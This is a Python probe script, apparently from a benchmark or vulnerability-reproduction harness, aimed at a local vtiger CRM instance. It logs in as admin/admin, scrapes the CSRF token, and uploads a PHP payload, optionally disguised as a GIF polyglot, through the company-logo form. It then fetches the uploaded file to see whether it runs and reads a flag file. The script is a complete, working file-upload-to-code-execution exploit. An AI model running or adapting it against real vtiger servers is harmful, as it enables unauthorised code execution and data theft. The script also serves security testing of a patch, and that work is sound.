#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39460",
    "v1": "http://127.0.0.1:39461",
}
import argparse
import json
import os
import re
import secrets
import subprocess
import sys
import time
from pathlib import Path
import requests
GIF89A = bytes.fromhex(
    "47494638396101000100800000ffffff0000002124f9040000000000"
    "2c00000000010001000002024401003b"
)
PHP = b"<?=@file_get_contents('/flag/pcb_flag.txt')?>"
USER, PW = "admin", "admin"
BASE = {
    "v0": "http://127.0.0.1:39460",
    "v1": "http://127.0.0.1:39461",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    is_dict = isinstance(candidate, dict)
    content_kind = candidate.get("content_kind", "plain_php") if is_dict else "plain_php"
    ctype = candidate.get("content_type", "image/gif") if is_dict else "image/gif"
    stem = candidate.get("filename", "pcb.php") if is_dict else "pcb.php"
    
    nonce = secrets.token_hex(4)
    fname = stem[:-4] + f"_{nonce}.php" if stem.endswith(".php") else f"{stem}_{nonce}.php"
    result = {"version": version, "content_kind": content_kind, "filename": fname}
    try:
        s = _login(base)
        token = _company_form(s, base)
        data = {
            "__vtrftk": token, "module": "Vtiger", "parent": "Settings",
            "action": "CompanyDetailsSave", "organizationname": "vtiger",
            "city": "B", "state": "K", "code": "1", "country": "I",
            "phone": "1", "fax": "1", "website": "x", "vatid": "1",
        }
        files = {"logo": (fname, _payload(content_kind), ctype)}
        rp = s.post(f"{base}/index.php", data=data, files=files, timeout=30, allow_redirects=False)
        result["post_status"] = rp.status_code
        result["reload_location"] = rp.headers.get("Location", "")
        result["blocked_by_guard"] = "error=LBL_INVALID_IMAGE" in result["reload_location"]
        fr = requests.get(f"{base}/test/logo/{fname}", timeout=25)
        result["fetch_status"] = fr.status_code
        result["fetched_body"] = fr.text[:200]
    except Exception as e:  
        result["error"] = f"{type(e).__name__}: {e}"
    return result
def _login(base: str) -> requests.Session:
    s = requests.Session()
    s.get(f"{base}/index.php", timeout=25)
    r = s.post(f"{base}/index.php",
               data={"module": "Users", "action": "Login", "username": USER, "password": PW},
               timeout=25, allow_redirects=True)
    if "Sign Out" not in r.text and "logout" not in r.text.lower():
        raise RuntimeError("admin login failed")
    return s
def _payload(content_kind: str) -> bytes:
    if content_kind == "gif_polyglot":
        return GIF89A + PHP
    return PHP
def _company_form(s: requests.Session, base: str) -> str:
    
    h = s.get(f"{base}/index.php?module=Vtiger&parent=Settings&view=CompanyDetails",
              timeout=25).text
    m = re.search(r'name=[\'"]__vtrftk[\'"]\s+value="([^"]+)"', h)
    if not m:
        raise RuntimeError("__vtrftk token not found on CompanyDetails form")
    return m.group(1)


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))